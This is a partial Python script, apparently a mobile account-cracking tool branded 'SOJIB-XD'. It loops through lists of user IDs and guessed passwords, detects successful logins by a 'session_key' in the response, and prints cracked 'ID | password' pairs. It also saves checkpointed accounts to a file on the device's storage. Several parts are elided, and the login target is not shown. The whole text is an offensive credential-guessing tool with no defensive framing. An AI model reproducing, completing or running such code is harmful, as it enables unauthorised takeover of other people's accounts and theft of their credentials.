...
#--------------------< SYS >--------------------#
sys.stdout.write('\x1b]2; <[SOJIB-XD]>\x07')
#--------------------< COLOUR >--------------------#
...
#--------------------< FILE MENU >--------------------#
def ___file___():
	clear();print(f'{xd} EXAMPLE {xdxx} /sdcard/SOJIB.txt');linex();file=input(f"{xdx} ENTER FILE NAME {xdxx} ")
	try:
...
def ___M1___(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r\r{R}<{W}={R}>{W}-{R}<{G}MR-SOJIB{R}>{W}-{R}|{T}%s{R}|{W}-{R}|{G}%s{R}|{W}-{R}|{P}%s{R}| '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}SOJIB-OK{R}>{G} '+ids+' | '+pas+'\033[1;97m')
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r{R}<{W}={R}>{W}-{R}<{P}SOJIB-CP{R}>{P} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SOJIB-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:continue
                loop+=1
